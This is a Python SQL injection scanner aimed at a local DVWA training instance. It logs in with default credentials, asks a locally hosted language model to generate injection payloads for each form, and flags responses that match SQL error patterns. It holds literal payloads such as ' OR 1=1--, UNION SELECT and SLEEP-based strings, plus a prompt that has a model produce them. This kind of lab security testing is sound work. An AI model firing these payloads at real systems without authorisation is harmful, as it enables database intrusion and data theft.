import requests
import json
import os
from bs4 import BeautifulSoup
from openai import OpenAI
from dotenv import load_dotenv

load_dotenv()

BASE = "http://localhost:8080/"
LOGIN_URL = BASE + "login.php"

session = requests.Session()

# ---------- OLLAMA CONFIG ----------
OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "qwen3.5:397b-cloud")

client = OpenAI(
    base_url=OLLAMA_BASE_URL,
    api_key="ollama"
)

print(f"[+] Using Ollama model: {OLLAMA_MODEL} at {OLLAMA_BASE_URL}")


# ---------- LLM PAYLOAD GENERATOR ----------
def generate_llm_payloads(form_data):

    prompt = f"""
You are a cybersecurity penetration tester.

Generate SQL injection payloads for testing this web form.

Form inputs:
{form_data}

Return ONLY a JSON list of payload strings.

Example:
[
 "' OR '1'='1",
 "' OR 1=1--",
 "' UNION SELECT NULL--",
 "' AND SLEEP(5)--"
]
"""

    try:

        response = client.chat.completions.create(
            model=OLLAMA_MODEL,
            messages=[
                {"role": "user", "content": prompt}
            ]
        )

        text = response.choices[0].message.content.strip()

        # remove markdown blocks if present
        if text.startswith("```json"):
            text = text[7:]
        if text.startswith("```"):
            text = text[3:]
        if text.endswith("```"):
            text = text[:-3]

        payloads = json.loads(text.strip())

        if isinstance(payloads, list) and len(payloads) > 0:
            return payloads

    except Exception as e:
        print("LLM payload generation failed:", e)

    # fallback payloads
    return [
        "'",
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--"
    ]


# ---------- LOGIN TO DVWA ----------
def login():

    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else ""

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token_value
    }

    login = session.post(LOGIN_URL, data=data)

    if "logout.php" in login.text:
        print("Login successful\n")
    else:
        print("Login failed")
        exit()

    session.cookies.set("security", "low")


# ---------- LOAD FORMS ----------
def load_forms():
    with open("forms.json", "r") as f:
        return json.load(f)


# ---------- SQL ERROR PATTERNS ----------
errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "sql syntax",
    "database error"
]


# ---------- SUCCESS PATTERNS ----------
success_patterns = [
    "first name",
    "surname",
    "user id exists"
]


# ---------- SQLI SCANNER ----------
def scan_forms(forms):

    vulnerabilities = []
    seen = set()

    for form in forms:

        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        if "login.php" in action:
            continue

        print("Scanning Form:", action)

        # 🔹 Generate payloads for this form using LLM
        payloads = generate_llm_payloads(inputs)

        print("Generated Payloads:", payloads)

        for payload in payloads:

            data = {}

            for inp in inputs:

                name = inp.get("name")
                if not name:
                    continue

                if inp["type"] == "submit":
                    data[name] = "Submit"
                else:
                    data[name] = payload

            try:

                if method == "post":
                    res = session.post(action, data=data)
                else:
                    res = session.get(action, params=data)

                content = res.text.lower()

                if (any(error in content for error in errors) or
                    any(pattern in content for pattern in success_patterns)):

                    key = action + payload

                    if key not in seen:
                        seen.add(key)

                        print("SQL Injection Found!")
                        print("URL:", action)
                        print("Payload:", payload)
                        print()

                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "url": action,
                            "payload": payload
                        })

            except requests.exceptions.RequestException:
                continue

    return vulnerabilities


# ---------- MAIN ----------
login()

forms = load_forms()

print("Starting SQL Injection Scan...\n")

vulnerabilities = scan_forms(forms)

with open("vulnerabilities.json", "w") as f:
    json.dump(vulnerabilities, f, indent=4)

print("Scan Completed")